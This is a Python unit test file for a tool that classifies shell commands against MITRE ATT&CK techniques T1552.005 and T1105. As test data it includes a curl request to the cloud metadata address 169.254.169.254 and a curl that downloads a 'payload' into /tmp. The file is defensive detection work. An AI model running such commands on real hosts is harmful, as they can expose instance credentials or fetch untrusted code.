import unittest

from levels.level2.validator import validate_command
from levels.level3.mapper import map_actions
from levels.level3.validator import validate_scenario as validate_level3


def _fact_input(*facts):
    return {
        "raw_command": "http-client --structured-input",
        "executable": {"raw": "http-client", "normalized": "http-client"},
        "argv": [],
        "elements": [],
        "resources": {"requires": [], "produces": []},
        "facts": list(facts),
    }


class FactBasedActionMappingTests(unittest.TestCase):
    def test_cloud_metadata_fact_maps_without_command_specific_logic(self):
        fact = {
            "type": "endpoint",
            "identity": {"url": "http://metadata.internal/credentials"},
            "attributes": {
                "protocol": "http",
                "address": "metadata.internal",
                "class": "cloud_metadata",
            },
        }

        mapped = map_actions(_fact_input(fact))

        self.assertEqual(len(mapped["actions"]), 1)
        action = mapped["actions"][0]
        self.assertEqual(action["action"], "CONNECT_ENDPOINT")
        self.assertEqual(action["context"], {"endpoint_type": "cloud_metadata"})
        self.assertEqual(action["evidence"]["source_fact"], fact)
        self.assertEqual(
            action["evidence"]["source_command"],
            "http-client --structured-input",
        )

    def test_general_endpoint_does_not_gain_cloud_metadata_context(self):
        fact = {
            "type": "endpoint",
            "identity": {"url": "https://example.com/payload"},
            "attributes": {
                "protocol": "https",
                "address": "example.com",
            },
        }

        mapped = map_actions(_fact_input(fact))

        self.assertFalse(mapped["action_validation"]["mapped"])
        self.assertFalse(
            any(
                action.get("context", {}).get("endpoint_type")
                == "cloud_metadata"
                for action in mapped["actions"]
            )
        )

    def test_download_with_local_output_maps_to_write_file(self):
        fact = {
            "type": "transfer",
            "identity": {
                "source": "https://example.com/payload",
                "output_path": "/tmp/payload",
            },
            "attributes": {
                "direction": "download",
                "output_path_type": "temporary",
            },
        }

        mapped = map_actions(_fact_input(fact))

        self.assertEqual(len(mapped["actions"]), 1)
        action = mapped["actions"][0]
        self.assertEqual(action["action"], "WRITE_FILE")
        self.assertEqual(
            action["context"],
            {"transfer_source": "external", "path_type": "temporary"},
        )
        self.assertEqual(action["evidence"]["source_fact"], fact)
        self.assertEqual(
            action["evidence"]["source_url"],
            "https://example.com/payload",
        )
        self.assertEqual(action["evidence"]["output_path"], "/tmp/payload")

    def test_download_without_local_output_does_not_map_file_action(self):
        fact = {
            "type": "transfer",
            "identity": {"source": "https://example.com/payload"},
            "attributes": {"direction": "download"},
        }

        mapped = map_actions(_fact_input(fact))

        self.assertFalse(mapped["action_validation"]["mapped"])


class FactBasedTechniqueEndToEndTests(unittest.TestCase):
    def test_cloud_metadata_request_matches_t1552_005(self):
        scenario = {
            "technique_id": "T1552.005",
            "steps": [
                {
                    "order": 1,
                    "command": "curl http://169.254.169.254/latest/meta-data/",
                }
            ],
        }

        result = validate_level3(scenario)

        self.assertEqual(result["status"], "PASS")
        self.assertTrue(result["technique_validation"]["matched"])
        action = result["steps"][0]["actions"][0]
        self.assertEqual(action["action"], "CONNECT_ENDPOINT")
        self.assertEqual(action["context"]["endpoint_type"], "cloud_metadata")
        self.assertEqual(action["evidence"]["source_fact"]["type"], "endpoint")

    def test_general_endpoint_does_not_match_t1552_005(self):
        scenario = {
            "technique_id": "T1552.005",
            "steps": [
                {"order": 1, "command": "curl https://example.com/"}
            ],
        }

        result = validate_level3(scenario)

        self.assertNotEqual(result["status"], "PASS")
        self.assertIsNot(result["technique_validation"]["matched"], True)

    def test_download_to_local_output_matches_t1105(self):
        scenario = {
            "technique_id": "T1105",
            "steps": [
                {
                    "order": 1,
                    "command": (
                        "curl -o /tmp/payload "
                        "https://example.com/payload"
                    ),
                }
            ],
        }

        result = validate_level3(scenario)

        self.assertEqual(result["status"], "PASS")
        self.assertTrue(result["technique_validation"]["matched"])
        action = result["steps"][0]["actions"][0]
        self.assertEqual(action["action"], "WRITE_FILE")
        self.assertEqual(action["context"]["transfer_source"], "external")
        self.assertEqual(action["context"]["path_type"], "temporary")
        self.assertEqual(
            action["evidence"]["source_fact"]["identity"]["output_path"],
            "/tmp/payload",
        )

    def test_temporary_file_without_transfer_does_not_match_t1105(self):
        scenario = {
            "technique_id": "T1105",
            "steps": [{"order": 1, "command": "touch /tmp/payload"}],
        }

        result = validate_level3(scenario)

        self.assertNotEqual(result["status"], "PASS")
        self.assertIsNot(result["technique_validation"]["matched"], True)
        action = result["steps"][0]["actions"][0]
        self.assertEqual(action["action"], "CREATE_FILE")
        self.assertEqual(action["context"], {"path_type": "temporary"})

    def test_level2_fact_schema_used_by_fact_rules(self):
        metadata = validate_command(
            "curl http://169.254.169.254/latest/meta-data/"
        )
        transfer = validate_command(
            "curl -o /tmp/payload https://example.com/payload"
        )

        endpoint_fact = next(
            fact for fact in metadata["facts"] if fact["type"] == "endpoint"
        )
        transfer_fact = next(
            fact for fact in transfer["facts"] if fact["type"] == "transfer"
        )
        self.assertEqual(endpoint_fact["attributes"]["class"], "cloud_metadata")
        self.assertEqual(transfer_fact["attributes"]["direction"], "download")
        self.assertEqual(
            transfer_fact["identity"],
            {
                "source": "https://example.com/payload",
                "output_path": "/tmp/payload",
            },
        )


if __name__ == "__main__":
    unittest.main()
